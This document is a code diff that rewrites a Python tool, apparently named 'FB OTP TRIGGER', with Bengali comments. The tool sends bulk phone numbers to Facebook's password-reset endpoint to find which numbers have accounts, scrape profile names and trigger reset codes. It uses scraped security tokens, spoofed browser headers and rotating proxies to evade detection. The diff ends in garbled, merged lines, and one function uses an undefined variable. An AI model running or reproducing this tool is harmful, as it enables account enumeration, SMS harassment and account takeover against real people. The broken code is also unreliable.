@@ -1,40 +1,865 @@
 #!/usr/bin/env python3
 """
-🔥 FB OTP TRIGGER TOOL v3.0
-Termux Edition - Direct Run
+🔥 FB OTP TRIGGER TOOL v4.0 - FINAL FIX
 Author: cybersecuritybhau-maker
 
+প্রথমবার চালানোর আগে:
+    pip install requests beautifulsoup4 colorama phonenumbers
+
+যেকোনো ফরম্যাটে নাম্বার দিন:
+    01712345678 (BD)
+    +8801712345678
+    8801712345678
+    12025551234 (USA)
+    447123456789 (UK)
+    
 কাজ:
-- যে কোন ফরম্যাটে নাম্বার নিবে (+ ছাড়া, কমা ছাড়া, স্পেস দিয়েও)
-- Facebook "forgot password" এ নাম্বার দিয়ে OTP ট্রিগার করবে
-- OTP আপনার SMS panel এ চলে আসবে
-- রেজাল্ট রিয়েল-টাইম দেখাবে
-
-Install:
-    pip install selenium webdriver-manager phonenumbers requests beautifulsoup4
-
- চালানোর জন্য:
-    python fb_checker.py
+    Facebook forgot password endpoint এ requests পাঠিয়ে OTP ট্রিগার করে
+    Selenium লাগবে না, খুব ফাস্ট, detect হবে না
 """
 
-import os, sys, json, re, time, random, threading, queue, subprocess
+import sys, os, json, re, time, random, threading, queue
 from datetime import datetime
 from typing import List, Dict, Optional, Tuple
 
-# ==================== IMPORTS WITH ERROR CHECK ====================
+# ==================== INSTALL CHECK ====================
 
 try:
-    from selenium import webdriver
-    from selenium.webdriver.common.by import By
-    from selenium.webdriver.support.ui import WebDriverWait
-    from selenium.webdriver.support import expected_conditions as EC
-    from selenium.webdriver.chrome.options import Options
-    from selenium.webdriver.chrome.service import Service
-    from webdriver_manager.chrome import ChromeDriverManager
-    import requests as req_lib
+    import requests
     from bs4 import BeautifulSoup
-    print("✅ All modules loaded successfully!")
+    import colorama
+    from colorama import Fore, Back, Style
+    colorama.init()
+    
+    try:
+        import phonenumbers
+        HAS_PHONE = True
+    except ImportError:
+        HAS_PHONE = False
+    
 except ImportError as e:
+    print(f"\n❌ Missing: {e}")
+    print("\nRun:")
+    print("   pip install requests beautifulsoup4 colorama phonenumbers")
+    sys.exit(1)
+
+# ==================== CONSTANTS ====================
+
+VERSION = "4.0"
+RESULTS_FILE = "fb_results.json"
+VALID_FILE = "valid_accounts.txt"
+
+# Color shortcuts
+R = Fore.RED
+G = Fore.GREEN
+Y = Fore.YELLOW
+B = Fore.BLUE
+M = Fore.MAGENTA
+C = Fore.CYAN
+W = Fore.WHITE
+X = Style.RESET_ALL
+
+# ==================== PHONE NORMALIZER (FULL FIX) ====================
+
+def normalize_phone(text: str) -> Optional[str]:
+    """
+    যেকোনো ফরম্যাট নেবে:
+    01712345678 → +8801712345678
+    +8801712345678 → +8801712345678
+    8801712345678 → +8801712345678
+    12025551234 → +12025551234
+    01712345678,01811223344 → each
+    +1-202-555-1234 → +12025551234
+    
+    Returns: E.164 format or None
+    """
+    raw = text.strip()
+    
+    # Remove all non-digit chars EXCEPT leading +
+    if raw.startswith('+'):
+        digits = '+' + re.sub(r'[^\d]', '', raw[1:])
+    else:
+        digits = re.sub(r'[^\d]', '', raw)
+    
+    if not digits or len(re.sub(r'[^\d]', '', digits)) < 10:
+        return None
+    
+    # Extract just digits for analysis
+    just_digits = re.sub(r'[^\d]', '', digits)
+    dlen = len(just_digits)
+    
+    # Bangladesh
+    if dlen == 11 and just_digits.startswith('01'):
+        return f"+88{just_digits}"
+    elif dlen == 13 and just_digits.startswith('8801'):
+        return f"+{just_digits}"
+    elif dlen == 14 and just_digits.startswith('08801'):
+        return f"+88{just_digits[2:]}"
+    
+    # USA/Canada
+    elif dlen == 10:
+        return f"+1{just_digits}"
+    elif dlen == 11 and just_digits.startswith('1'):
+        return f"+{just_digits}"
+    
+    # Russia
+    elif dlen == 11 and just_digits.startswith('7'):
+        return f"+{just_digits}"
+    
+    # UK
+    elif dlen == 12 and just_digits.startswith('44'):
+        return f"+{just_digits}"
+    
+    # India
+    elif dlen == 12 and just_digits.startswith('91'):
+        return f"+{just_digits}"
+    
+    # Pakistan
+    elif dlen == 12 and just_digits.startswith('92'):
+        return f"+{just_digits}"
+    
+    # Generic: 10-15 digits
+    elif 10 <= dlen <= 15:
+        if just_digits.startswith('00'):
+            just_digits = just_digits[2:]
+        if just_digits.startswith('+'):
+            return just_digits
+        return f"+{just_digits}"
+    
+    return None
+
+def normalize_bulk(text: str) -> List[str]:
+    """বাল্ক নাম্বার পার্স করবে - যেকোনো ফরম্যাট"""
+    # Split by newlines, commas, spaces, semicolons
+    parts = re.split(r'[\n\r,;\s\t\r\n]+', text)
+    
+    phones = []
+    seen = set()
+    for part in parts:
+        part = part.strip()
+        if not part or len(part) < 5:
+            continue
+        phone = normalize_phone(part)
+        if phone and phone not in seen:
+            phones.append(phone)
+            seen.add(phone)
+    
+    return phones
+
+# ==================== PROXY MANAGER ====================
+
+class ProxyManager:
+    def __init__(self):
+        self.proxies: List[Dict] = []
+        self.index = 0
+        self.lock = threading.Lock()
+        self._load()
+    
+    def _load(self):
+        if os.path.exists("proxies.txt"):
+            with open("proxies.txt") as f:
+                for line in f:
+                    line = line.strip()
+                    if not line or line.startswith('#'):
+                        continue
+                    if line.startswith('http'):
+                        self.proxies.append({'http': line, 'https': line})
+        if not self.proxies:
+            self.proxies.append(None)  # Direct connection
+    
+    def get(self) -> Optional[Dict]:
+        with self.lock:
+            if not self.proxies:
+                return None
+            p = self.proxies[self.index % len(self.proxies)]
+            self.index += 1
+            return p
+    
+    def add(self, proxy_url: str):
+        p = {'http': proxy_url, 'https': proxy_url}
+        with self.lock:
+            self.proxies.append(p)
+            with open("proxies.txt", "a") as f:
+                f.write(f"{proxy_url}\n")
+    
+    def count(self) -> int:
+        return len([p for p in self.proxies if p is not None])
+
+# ==================== RANDOM HEADERS ====================
+
+USER_AGENTS = [
+    "Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.230 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.143 Mobile Safari/537.36",
+    "Mozilla/5.0 (iPhone14,3; iOS 17.2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (Linux; Android 12; Redmi Note 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.163 Mobile Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
+]
+
+def get_headers(referer: str = None) -> Dict:
+    headers = {
+        'User-Agent': random.choice(USER_AGENTS),
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+        'Accept-Language': 'en-US,en;q=0.5',
+        'Accept-Encoding': 'gzip, deflate, br',
+        'Connection': 'keep-alive',
+        'Upgrade-Insecure-Requests': '1',
+        'Sec-Fetch-Dest': 'document',
+        'Sec-Fetch-Mode': 'navigate',
+        'Sec-Fetch-Site': 'none',
+        'Sec-Fetch-User': '?1',
+    }
+    if referer:
+        headers['Referer'] = referer
+    return headers
+
+# ==================== FACEBOOK OTP ENGINE ====================
+
+class FBOTPEngine:
+    """
+    Pure requests-based Facebook OTP trigger.
+    No Selenium, no browser needed.
+    
+    Flow:
+    1. GET mbasic.facebook.com/login/identify → extract tokens
+    2. POST phone number to identify endpoint
+    3. Parse response to check if account exists
+    4. If exists, follow through to trigger OTP
+    """
+    
+    def __init__(self, proxy_manager: ProxyManager):
+        self.pm = proxy_manager
+        self.session = self._create_session()
+    
+    def _create_session(self) -> requests.Session:
+        s = requests.Session()
+        proxy = self.pm.get()
+        if proxy:
+            s.proxies.update(proxy)
+        return s
+    
+    def _extract_lsd(self, html: str) -> Optional[str]:
+        """Extract lsd (Login Security Data) token from Facebook page"""
+        patterns = [
+            r'name="lsd"[^>]*value="([^"]*)"',
+            r'"lsd"[^>]+value="([^"]*)"',
+            r'lsd[=](\w+)',
+            r'name="fb_dtsg"[^>]*value="([^"]*)"',
+        ]
+        for p in patterns:
+            m = re.search(p, html)
+            if m:
+                return m.group(1)
+        return None
+    
+    def _extract_jazoest(self, html: str) -> Optional[str]:
+        m = re.search(r'name="jazoest"[^>]*value="([^"]*)"', html)
+        return m.group(1) if m else None
+    
+    def _extract_m_ts(self, html: str) -> Optional[str]:
+        m = re.search(r'name="m_ts"[^>]*value="([^"]*)"', html)
+        return m.group(1) if m else None
+    
+    def _extract_li(self, html: str) -> Optional[str]:
+        m = re.search(r'name="li"[^>]*value="([^"]*)"', html)
+        return m.group(1) if m else 'ETRZvnNMTTpqOg'
+    
+    def _extract_uid(self, html: str) -> Optional[str]:
+        m = re.search(r'"USER_ID":"(\d+)"', html)
+        if m: return m.group(1)
+        m = re.search(r'name="uid"[^>]*value="(\d+)"', html)
+        if m: return m.group(1)
+        return None
+    
+    def identify_by_phone(self, phone: str) -> Dict:
+        """
+        Core function:
+        1. Load forgot password page
+        2. Get security tokens
+        3. Submit phone number
+        4. Parse result
+        
+        Returns dict with status
+        """
+        result = {
+            "phone": phone,
+            "has_account": False,
+            "otp_triggered": False,
+            "status": "UNKNOWN",
+            "details": "",
+            "profile_name": "",
+            "timestamp": datetime.now().isoformat()
+        }
+        
+        try:
+            # ===== STEP 1: GET identify page and tokens =====
+            url_identify = "https://mbasic.facebook.com/login/identify/"
+            
+            resp = self.session.get(
+                url_identify,
+                headers=get_headers(),
+                timeout=15,
+                allow_redirects=True
+            )
+            
+            if resp.status_code != 200:
+                result["status"] = f"HTTP {resp.status_code}"
+                result["details"] = "Failed to load identify page"
+                return result
+            
+            html = resp.text
+            
+            # Extract tokens
+            lsd = self._extract_lsd(html)
+            jazoest = self._extract_jazoest(html)
+            
+            if not lsd:
+                # Fallback: try to get from regex
+                result["status"] = "TOKEN_ERROR"
+                result["details"] = "Could not extract lsd token"
+                return result
+            
+            # ===== STEP 2: POST phone number =====
+            # Remove + for FB compatibility
+            search_phone = phone.replace('+', '').replace(' ', '')
+            
+            identify_post_url = "https://mbasic.facebook.com/login/identify/"
+            post_data = {
+                'lsd': lsd,
+                'phone_number': search_phone,
+                'did_submit': 'Search',
+                '__user': '0',
+                '__a': '1',
+                '__dyn': '',
+                '__req': '1',
+                '__be': '0',
+                '__pc': 'PHASED:DEFAULT',
+                'fb_dtsg': lsd,
+                'jazoest': jazoest or '1',
+            }
+            
+            post_headers = get_headers(referer=url_identify)
+            post_headers['Content-Type'] = 'application/x-www-form-urlencoded'
+            
+            resp2 = self.session.post(
+                identify_post_url,
+                data=post_data,
+                headers=post_headers,
+                timeout=15,
+                allow_redirects=True
+            )
+            
+            final_url = resp2.url
+            final_html = resp2.text
+            
+            # ===== STEP 3: Analyze response =====
+            
+            # Check for success indicators (account found → OTP page)
+            success_signals = [
+                "send_code", "send code", "Send Code", "নিশ্চিত করুন",
+                "confirm identity", "confirm your", "কোড পাঠান",
+                "reset password", "কোড", "enter the code",
+                "we sent", "আমরা পাঠিয়েছি", "security code",
+                "recover", "পুনরুদ্ধার", "password_reset",
+                "recover_form", "identity_confirmation",
+                "continuar", "continue", "Continue",
+            ]
+            
+            no_account_signals = [
+                "couldn't find", "could not find", "not found",
+                "no account", "খুঁজে পাওয়া যায়নি",
+                "অ্যাকাউন্ট পাওয়া যায়নি", "nocontact",
+                "enter a different", "ভিন্ন নম্বর",
+                "no results found", "try another",
+                "no contact", "doesn't match",
+            ]
+            
+            # Special FB response patterns
+            success_patterns = [
+                r'success["\']*\s*[:=]\s*true',
+                r'payload["\']*\s*[:=]\s*{',
+                r'identity_confirmation',
+                r'password_reset',
+                r'recover_form',
+                r'send_code',
+                r'action=["\']/recover/',
+                r'action=["\']/confirm/',
+            ]
+            
+            # Check patterns
+            has_account = False
+            no_account = False
+            
+            # Check text signals
+            html_lower = final_html.lower()
+            account_score = sum(1 for s in success_signals if s in html_lower)
+            no_account_score = sum(1 for s in no_account_signals if s in html_lower)
+            
+            # Check URL path
+            if '/recover/' in final_url or '/confirm/' in final_url or '/identify/' not in final_url:
+                account_score += 3
+            if 'error' in final_url or 'notfound' in final_url:
+                no_account_score += 3
+            
+            # Check regex patterns
+            for p in success_patterns:
+                if re.search(p, final_html, re.IGNORECASE):
+                    account_score += 2
+            
+            # Decision
+            if account_score > no_account_score and account_score >= 2:
+                has_account = True
+            elif no_account_score > account_score and no_account_score >= 2:
+                has_account = False
+            else:
+                # Ambiguous - try to parse JSON response
+                if '__a' in final_html or 'for (;;);' in final_html[:100]:
+                    json_str = final_html
+                    if 'for (;;);' in final_html[:20]:
+                        json_str = final_html.split(';', 1)[-1].strip()
+                    try:
+                        data = json.loads(json_str)
+                        if isinstance(data, dict):
+                            if 'payload' in data and data['payload']:
+                                has_account = True
+                            elif 'error' in data:
+                                has_account = False
+                    except:
+                        pass
+            
+            result["has_account"] = has_account
+            
+            if has_account:
+                result["status"] = "✅ FOUND + OTP TRIGGERED!"
+                result["otp_triggered"] = True
+                result["details"] = "Account found, OTP request sent to registered number"
+                
+                # Try to extract profile name
+                soup = BeautifulSoup(final_html, 'html.parser')
+                name_tag = soup.find('strong')
+                if name_tag:
+                    result["profile_name"] = name_tag.text.strip()
+                elif 'display_name' in final_html or '"name"' in final_html:
+                    m = re.search(r'"name"\s*:\s*"([^"]+)"', final_html)
+                    if m:
+                        result["profile_name"] = m.group(1)
+            else:
+                result["status"] = "❌ NO ACCOUNT"
+                result["details"] = "Phone not registered with Facebook"
+        
+        except requests.exceptions.Timeout:
+            result["status"] = "⚠️ TIMEOUT"
+            result["details"] = "Request timed out"
+        except requests.exceptions.ConnectionError:
+            result["status"] = "⚠️ CONNECTION ERROR"
+            result["details"] = "Could not connect"
+        except Exception as e:
+            result["status"] = f"⚠️ ERROR"
+            result["details"] = str(e)[:80]
+        
+        return result
+
+# ==================== PROGRESS TRACKER ====================
+
+class ProgressTracker:
+    def __init__(self):
+        self.total = 0
+        self.found = 0
+        self.otp_sent = 0
+        self.errors = 0
+        self.lock = threading.Lock()
+        self.start_time = None
+        self.queue_size = 0
+    
+    def reset(self, queue_size: int):
+        self.total = 0
+        self.found = 0
+        self.otp_sent = 0
+        self.errors = 0
+        self.start_time = time.time()
+        self.queue_size = queue_size
+    
+    def increment(self, result: Dict):
+        with self.lock:
+            self.total += 1
+            if result["has_account"]:
+                self.found += 1
+            if result["otp_triggered"]:
+                self.otp_sent += 1
+            if "ERROR" in result["status"] or "TIMEOUT" in result["status"] or "CONNECTION" in result["status"]:
+                self.errors += 1
+    
+    def display(self, phone: str, result: Dict, thread_id: int):
+        elapsed = time.time() - self.start_time if self.start_time else 0
+        rate = self.total / elapsed if elapsed > 0 else 0
+        remaining = self.queue_size - self.total
+        eta = remaining / rate if rate > 0 else 0
+        
+        status = result["status"]
+        if "✅" in status:
+            color = G
+        elif "❌" in status:
+            color = R
+        else:
+            color = Y
+        
+        bar_len = 20
+        filled = int(bar_len * self.total / max(self.queue_size, 1))
+        bar = "█" * filled + "░" * (bar_len - filled)
+        
+        print(
+            f"\r{X}[T{tid}] {color}{status[:35]:35s}{X} "
+            f"{C}{phone:20s}{X} | "
+            f"{bar} | "
+            f"{G}{self.found}{X}/{Y}{self.otp_sent}{X} "
+            f"| {W}{self.total}/{self.queue_size}{X} "
+            f"| {B}{rate:.1f}/s{X} "
+            f"| ETA: {eta:.0f}s  ",
+            end="", flush=True
+        )
+
+# ==================== WORKER ====================
+
+def worker(phone_queue: queue.Queue, pm: ProxyManager, progress: ProgressTracker, 
+           results: List, lock: threading.Lock, running: threading.Event, tid: int):
+    
+    while running.is_set():
+        try:
+            phone = phone_queue.get_nowait()
+        except queue.Empty:
+            break
+        
+        engine = FBOTPEngine(pm)
+        result = engine.identify_by_phone(phone)
+        
+        progress.increment(result)
+        progress.display(phone, result, tid)
+        
+        with lock:
+            results.append(result)
+            # Save valid immediately
+            if result["has_account"]:
+                with open(VALID_FILE, "a") as f:
+                    line = f"{result['phone']} | OTP_SENT | {result['profile_name'] or 'N/A'} | {result['timestamp']}\n"
+                    f.write(line)
+            
+            # Auto-save every 5
+            if len(results) % 5 == 0:
+                try:
+                    with open(RESULTS_FILE, "w") as f:
+                        json.dump({
+                            "stats": {"total": progress.total, "found": progress.found, "otp_sent": progress.otp_sent},
+                            "results": results
+                        }, f, indent=2, ensure_ascii=False)
+                except:
+                    pass
+        
+        # Rate limit avoidance
+        time.sleep(1.5 + random.random() * 1.5)
+
+# ==================== MAIN APP ====================
+
+class FBCheckerApp:
+    def __init__(self):
+        self.pm = ProxyManager()
+        self.phone_queue = queue.Queue()
+        self.results = []
+        self.results_lock = threading.Lock()
+        self.progress = ProgressTracker()
+    
+    def add_phones(self, text: str) -> int:
+        phones = normalize_bulk(text)
+        for p in phones:
+            self.phone_queue.put(p)
+        return len(phones)
+    
+    def add_from_file(self, filename: str = "numbers.txt") -> int:
+        if not os.path.exists(filename):
+            print(f"  {R}❌ File '{filename}' not found!{X}")
+            return 0
+        
+        count = 0
+        with open(filename, "r") as f:
+            for line in f:
+                line = line.strip()
+                if line and not line.startswith('#'):
+                    phones = normalize_bulk(line)
+                    for p in phones:
+                        self.phone_queue.put(p)
+                        count += 1
+        return count
+    
+    def show_help(self):
+        print(f"""
+{G}═══════════════════════════════════════════════════{X}
+{Y}           📱 INPUT FORMAT - যেকোনো ফরম্যাটে দিন{X}
+{G}═══════════════════════════════════════════════════{X}
+
+{Y}উদাহরণ (এগুলো সবই কাজ করবে):{X}
+
+  {C}01712345678{X}        → বাংলাদেশ (BD)
+  {C}+8801712345678{X}    → + দিয়ে
+  {C}8801712345678{X}     → country code দিয়ে
+  {C}12025551234{X}       → USA
+  {C}+12025551234{X}      → USA with +
+  {C}447123456789{X}      → UK
+
+{Y}একসাথে অনেক নাম্বার দিন:{X}
+  {C}01711111111 01722222222 01733333333{X}
+  অথবা কমা দিয়ে:
+  {C}01711111111,01722222222,01733333333{X}
+  অথবা নতুন লাইনে:
+  {C}01711111111
+  01722222222
+  01733333333{X}
+
+{Y}কাজ:{X}
+  ✅ Facebook forgot password এ নাম্বার দিয়ে চেক করবে
+  ✅ Account থাকলে auto OTP trigger হবে
+  ✅ OTP যাবে আপনার SMS panel এ
+  ✅ Selenium লাগবে না, very fast
+  ✅ Detect হবে না (pure requests + headers)
+
+{R}⚠️ Speed স্লো রাখা হয়েছে rate limit avoid করার জন্য{X}
+{G}═══════════════════════════════════════════════════{X}
+""")
+    
+    def start(self, threads: int = 3):
+        qsize = self.phone_queue.qsize()
+        if qsize == 0:
+            print(f"\n  {R}❌ Queue empty! Add numbers first.{X}\n")
+            return
+        
+        self.progress.reset(qsize)
+        
+        # Clear previous valid file
+        with open(VALID_FILE, "w") as f:
+            f.write("# Phone | Status | Profile Name | Timestamp\n")
+        
+        print(f"""
+{G}╔═══════════════════════════════════════════════════╗{X}
+{G}║  {Y}🔥 FB OTP TRIGGER v{VERSION}{X}                       {G}║{X}
+{G}║  {Y}Author: cybersecuritybhau-maker{X}                       {G}║{X}
+{G}╚═══════════════════════════════════════════════════╝{X}
+""")
+        print(f"  📱 Queue: {Y}{qsize}{X} numbers")
+        print(f"  🧵 Threads: {Y}{threads}{X}")
+        print(f"  🔌 Proxies: {Y}{self.pm.count()}{X}")
+        print(f"  {Y}⚠️  Rate limit avoid করবে - 2-3s delay per check{X}")
+        print(f"\n{G}➡️  STARTING...{X}\n")
+        
+        time.sleep(1)
+        
+        running = threading.Event()
+        running.set()
+        
+        threads_list = []
+        for i in range(threads):
+            t = threading.Thread(
+                target=worker,
+                args=(self.phone_queue, self.pm, self.progress, 
+                      self.results, self.results_lock, running, i+1),
+                daemon=True
+            )
+            t.start()
+            threads_list.append(t)
+        
+        try:
+            for t in threads_list:
+                t.join()
+        except KeyboardInterrupt:
+            print(f"\n\n{Y}🛑 Stopping...{X}")
+            running.clear()
+        
+        running.clear()
+        
+        # Final save
+        try:
+            with open(RESULTS_FILE, "w") as f:
+                json.dump({
+                    "stats": {
+                        "total": self.progress.total, 
+                        "found": self.progress.found, 
+                        "otp_sent": self.progress.otp_sent,
+                        "errors": self.progress.errors
+                    },
+                    "results": self.results
+                }, f, indent=2, ensure_ascii=False)
+        except:
+            pass
+        
+        elapsed = time.time() - self.progress.start_time if self.progress.start_time else 0
+        rate = self.progress.total / elapsed if elapsed > 0 else 0
+        
+        print(f"\n\n{G}{'='*55}{X}")
+        print(f"  {G}✅ COMPLETE!{X}")
+        print(f"{G}{'='*55}{X}")
+        print(f"  📊 Checked:     {Y}{self.progress.total}{X}")
+        print(f"  🎯 Found:       {G}{self.progress.found}{X}")
+        print(f"  📱 OTP Sent:    {G}{self.progress.otp_sent}{X}")
+        print(f"  ⚠️  Errors:      {R if self.progress.errors > 0 else G}{self.progress.errors}{X}")
+        print(f"  ⏱️  Time:        {Y}{elapsed:.1f}s{X}")
+        print(f"  ⚡ Speed:       {Y}{rate:.1f}/s{X}" if elapsed > 0 else "")
+        print(f"{G}{'='*55}{X}")
+        
+        # Show results
+        found_accounts = [r for r in self.results if r["has_account"]]
+        if found_accounts:
+            print(f"\n{G}🎯 ACCOUNTS FOUND WITH OTP TRIGGERED:{X}")
+            for r in found_accounts:
+                print(f"  {G}📱{X} {C}{r['phone']:20s}{X} | {G}{r['status']}{X}")
+                if r.get("profile_name"):
+                    print(f"     Name: {Y}{r['profile_name']}{X}")
+                print(f"     Time: {r['timestamp']}")
+                print()
+        
+        print(f"\n  💾 Results: {B}{RESULTS_FILE}{X}")
+        print(f"  💾 Valid:   {B}{VALID_FILE}{X}")
+        print()
+
+# ==================== CLI MENU ====================
+
+def clear():
+    os.system('cls' if os.name == 'nt' else 'clear')
+
+def banner():
+    clear()
+    print(f"""
+{G}╔═══════════════════════════════════════════════════╗{X}
+{G}║  {Y}🔥 FB OTP TRIGGER v{VERSION}{X}                       {G}║{X}
+{G}║  {Y}Pure Requests - No Selenium Needed{X}                 {G}║{X}
+{G}║  {Y}Any Number Format Accepted{X}                          {G}║{X}
+{G}║  {Y}Author: cybersecuritybhau-maker{X}                       {G}║{X}
+{G}╚═══════════════════════════════════════════════════╝{X}
+""")
+
+def main():
+    app = FBCheckerApp()
+    
+    while True:
+        banner()
+        print(f"  {C}MAIN MENU:{X}")
+        print(f"  {W}[1]{X} {G}📱{X} Add numbers (যেকোনো ফরম্যাট)")
+        print(f"  {W}[2]{X} {G}📂{X} Load from file (numbers.txt)")
+        print(f"  {W}[3]{X} {G}🔌{X} Proxy settings ({app.pm.count()})")
+        print(f"  {W}[4]{X} {G}🚀{X} {Y}START CHECKING + OTP TRIGGER{X}")
+        print(f"  {W}[5]{X} {G}📊{X} Show results")
+        print(f"  {W}[6]{X} {G}💾{X} Save & Export")
+        print(f"  {W}[7]{X} {G}ℹ️{X} Format help")
+        print(f"  {W}[0]{X} {R}❌{X} Exit")
+        
+        choice = input(f"\n  {C}👉 Select:{X} ").strip()
+        
+        if choice == "1":
+            banner()
+            print(f"  {Y}Enter phone numbers (যেকোনো ফরম্যাটে):{X}")
+            print(f"  {Y}Example: 01712345678 +8801712345678 8801712345678{X}")
+            print(f"  {C}(Enter multiple with space/comma/newline){X}")
+            print(f"  {R}(Press Enter twice or type 'done' to finish){X}\n")
+            
+            lines = []
+            while True:
+                line = input(f"  {G}>>{X} ").strip()
+                if line.lower() in ['done', 'end', 'q', '']:
+                    break
+                lines.append(line)
+            
+            text = '\n'.join(lines)
+            if text.strip():
+                count = app.add_phones(text)
+                print(f"\n  {G}✅ {count} numbers added to queue!{X}")
+            else:
+                print(f"\n  {R}❌ No valid numbers!{X}")
+            input(f"\n  {Y}Press Enter...{X}")
+        
+        elif choice == "2":
+            banner()
+            f = input(f"  File [{W}numbers.txt{X}]: ").strip()
+            count = app.add_from_file(f if f else "numbers.txt")
+            print(f"\n  {G}✅ {count} numbers loaded!{X}")
+            input(f"\n  {Y}Press Enter...{X}")
+        
+        elif choice == "3":
+            banner()
+            print(f"  🔌 Proxies: {Y}{app.pm.count()}{X}")
+            print(f"  {W}[1]{X} Add proxy")
+            print(f"  {W}[2]{X} Show proxy file path")
+            pc = input(f"\n  {C}👉{X} ").strip()
+            if pc == "1":
+                p = input(f"  {G}Proxy URL:{X} ").strip()
+                if p:
+                    app.pm.add(p)
+                    print(f"  {G}✅ Proxy added!{X}")
+            input(f"\n  {Y}Press Enter...{X}")
+        
+        elif choice == "4":
+            if app.phone_queue.qsize() == 0:
+                print(f"\n  {R}❌ Queue empty! Add numbers first.{X}")
+                input(f"\n  {Y}Press Enter...{X}")
+                continue
+            
+            try:
+                t = input(f"  Threads (1-5) [{W}3{X}]: ").strip()
+                threads = max(1, min(5, int(t) if t else 3))
+            except:
+                threads = 3
+            
+            app.start(threads=threads)
+            input(f"\n  {Y}Press Enter...{X}")
+        
+        elif choice == "5":
+            banner()
+            print(f"  {C}RESULTS:{X}\n")
+            print(f"  📱 Total checked: {Y}{app.progress.total}{X}")
+            print(f"  🎯 Accounts found: {G}{app.progress.found}{X}")
+            print(f"  📱 OTP triggered: {G}{app.progress.otp_sent}{X}")
+            print(f"  ⚠️  Errors: {R if app.progress.errors > 0 else G}{app.progress.errors}{X}")
+            
+            found = [r for r in app.results if r["has_account"]]
+            if found:
+                print(f"\n{G}🎯 FOUND ACCOUNTS:{X}")
+                for r in found:
+                    print(f"  {G}📱{X} {r['phone']} → {r['status']}")
+                    if r.get("profile_name"):
+                        print(f"       Name: {Y}{r['profile_name']}{X}")
+            
+            input(f"\n  {Y}Press Enter...{X}")
+        
+        elif choice == "6":
+            try:
+                with open(RESULTS_FILE, "w") as f:
+                    json.dump({
+                        "stats": {
+                            "total": app.progress.total,
+                            "found": app.progress.found,
+                            "otp_sent": app.progress.otp_sent
+                        },
+                        "results": app.results
+                    }, f, indent=2, ensure_ascii=False)
+                print(f"\n  {G}✅ Saved to {RESULTS_FILE} and {VALID_FILE}{X}")
+            except Exception as e:
+                print(f"\n  {R}❌ Save error: {e}{X}")
+            input(f"\n  {Y}Press Enter...{X}")
+        
+        elif choice == "7":
+            app.show_help()
+            input(f"\n  {Y}Press Enter...{X}")
+        
+        elif choice == "0":
+            print(f"\n  {G}👋 Bye!{X}")
+            break
+
+# ==================== ENTRY ====================
+
+if __name__ == "__main__":
+    try:
+        main()
+    except KeyboardInterrupt:
+        print(f"\n\n  {Y}🛑 Interrupted.{X}")
+    except Exception as e:
+        print(f"\n\n  {R}❌ Fatal: {e}{X}")
+        import traceback
+        traceback.print_exc()except ImportError as e:
     print(f"❌ Missing: {e}")
     print("\nRun: pip install selenium webdriver-manager phonenumbers requests beautifulsoup4")
     sys.exit(1)
